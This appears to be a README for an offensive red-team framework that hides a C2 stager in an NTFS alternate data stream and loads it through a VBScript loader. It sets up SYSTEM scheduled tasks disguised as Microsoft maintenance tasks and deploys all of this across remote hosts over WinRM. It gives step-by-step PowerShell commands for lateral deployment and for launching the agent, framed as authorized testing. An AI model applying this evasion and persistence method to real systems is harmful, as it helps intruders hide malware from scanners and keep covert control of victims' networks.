# ADS-Drop-System: Stealthy Multi-Stage Persistence Framework

The **ADS-Drop-System** is a highly resilient post-exploitation framework designed for authorized penetration testing and red-team operations. It achieves extreme evasiveness and redundancy by leveraging native Windows features known as Living Off The Land Binaries and Scripts (LOLBAS) and Alternate Data Streams (ADS).

This system is optimized for use with the **Realm C2** framework and its **Imix Agent**.

## 🛡️ Key Features

*   **ADS Payload Concealment:** The Realm Imix PowerShell stager is hidden within an **Alternate Data Stream (`:syc_core`)** attached to a benign host file (`C:\ProgramData\SystemCache.dat`), bypassing most static file scanners.
*   **LOLBAS Execution Chain:** Uses a minimalistic VBScript loader (`app_log_a.vbs`) to read the hidden ADS content and launch it via an invisible `powershell.exe` process.
*   **High-Privilege Dual Persistence:** Creates two separate, SYSTEM-level persistence mechanisms via Scheduled Tasks:
    *   **Logon Trigger:** Runs on every user logon (`\Microsoft\Windows\Customer Experience Improvement Program\KernelConsolidator`).
    *   **Resilience Trigger:** Runs every 5 minutes to check for and restart the Imix agent process (`\Microsoft\Windows\SystemCheck\ProcessMonitor`).
*   **Administrative Deployment:** Includes the `Invoke-LateralDeploySyc` PowerShell function, which automates file staging, ADS creation, and Scheduled Task setup across multiple remote targets via `Invoke-Command` (Windows Remote Management).

## 💻 Usage & Deployment Flow

The deployment process is designed for an administrative user with remote execution privileges (e.g., via `WinRM`/`Invoke-Command`).

### Prerequisites

1.  **Realm C2:** Obtain the final, Base64-encoded, full PowerShell Imix Stager command string from your Realm console.
2.  **Privilege:** Ensure your current shell has Administrative privileges and connectivity to target hosts.

### Step 1: Execute Deployment Script

1.  Load the `Invoke-LateralDeploySyc` function.
    ```powershell
    . .\Invoke-LateralDeploySyc.ps1
    ```
2.  Run the function, passing the Base64-encoded Realm stager and the list of target hostnames.
    ```powershell
    # Example: Replace "YOUR_BASE64_STAGER" with the actual Imix Stager string
    $Stager = "YOUR_BASE64_STAGER"
    $Targets = @('TargetHostA', 'TargetHostB', '192.168.1.10')

    Invoke-LateralDeploySyc -TargetHosts $Targets -RealmStager $Stager -Verbose
    ```
3.  The script remotely creates all necessary files, ADS content, and Scheduled Tasks on the target hosts.

### Step 2: Initial Agent Launch

Though the resilience task will eventually fire, the following command fires the agent immediately.

```powershell
# Immediately run the VBScript on a target to launch the Imix agent
Invoke-Command -ComputerName TargetHostA -ScriptBlock { wscript.exe //B "C:\ProgramData\app_log_a.vbs" }
